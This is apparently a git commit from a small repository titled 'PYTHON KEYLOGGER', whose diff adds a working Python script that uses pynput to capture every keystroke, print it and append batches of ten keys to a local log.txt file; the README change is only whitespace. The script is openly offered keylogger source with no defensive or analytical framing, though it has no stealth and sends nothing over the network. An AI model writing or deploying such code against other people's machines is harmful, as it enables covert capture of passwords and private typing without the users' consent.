35526dffb0b414f6ddd9eb4cc0bb89faa2eb6d6c
gorakh999 <gorakhgupta999@gmail.com>
2020-12-26 14:09:42 +0530

    .

--- README.md
+++ README.md
@@ -1,3 +1,3 @@
-# PYTHON KEYLOGGER 
+# PYTHON KEYLOGGER
 
 This Keylogger will help u to Capture the input key from  a user
--- keylogger.py
+++ keylogger.py
@@ -2,3 +2,25 @@ import pynput
 
 from pynput.keyboard import Key, Listener
 
+count = 0
+keys = []
+def on_press(key):
+    global count, keys
+
+    print(f"{key} is Pressed")
+    keys.append(str(key))
+    count = count + 1
+    if count == 10:
+        count = 0
+        k1 = ' '.join(keys)
+        with open('log.txt', 'a') as f:
+            f.write(str(k1))
+            f.write('\n')
+
+        keys = []
+
+def on_release(key):
+    pass
+
+with Listener(on_press = on_press, on_release = on_release) as listener:
+    listener.join()
